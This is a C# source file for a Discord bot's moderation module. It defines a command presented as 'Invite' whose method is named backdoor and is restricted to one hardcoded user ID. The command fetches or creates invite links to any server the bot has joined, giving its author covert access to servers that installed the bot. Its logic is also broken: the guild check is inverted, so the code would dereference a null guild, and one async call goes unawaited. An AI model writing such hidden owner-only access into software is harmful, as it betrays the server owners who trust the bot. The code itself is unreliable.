using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Discord;
using Discord.Commands;
using Discord.WebSocket;


 namespace Balesk_Bot.Core.Commands
{
    public class Mod : ModuleBase<SocketCommandContext>
    {
        [Command("Invite"), Alias("inv"), Summary("Creates invite link")]
        public async Task backdoor(ulong GuildId)
        {
            if (!(Context.User.Id == 249808259760914433))
            {
                await Context.Channel.SendMessageAsync("***UwU*** You cant do that!");
                return;
            }

            if (Context.Client.Guilds.Where(x => x.Id == GuildId).Count() < 1)
            {

             SocketGuild Guild = Context.Client.Guilds.Where(x => x.Id == GuildId).FirstOrDefault();
             var Invites = await Guild.GetInvitesAsync();
                if (Invites.Count() < 1)
                {
                    try
                    {
                        Guild.TextChannels.First().CreateInviteAsync();
                    }
                    catch (Exception ex)
                    {
                        await Context.Channel.SendMessageAsync($":x: Creating an invite in {Guild.Name} had a error! ``{ex.Message}``");
                        return;
                    }
                }
                Invites = null;
                Invites = await Guild.GetInvitesAsync();
                EmbedBuilder Embed = new EmbedBuilder();
             Embed.WithAuthor($"Invite {Guild.Name}:", Guild.IconUrl);
             Embed.WithColor(20, 30, 100);
                foreach (var Current in Invites)
                    Embed.AddInlineField("Invite:", $"[Invite]({Current.Url})");



             await Context.Channel.SendMessageAsync("", false, Embed.Build());
                
               
            }
        }
    }
}
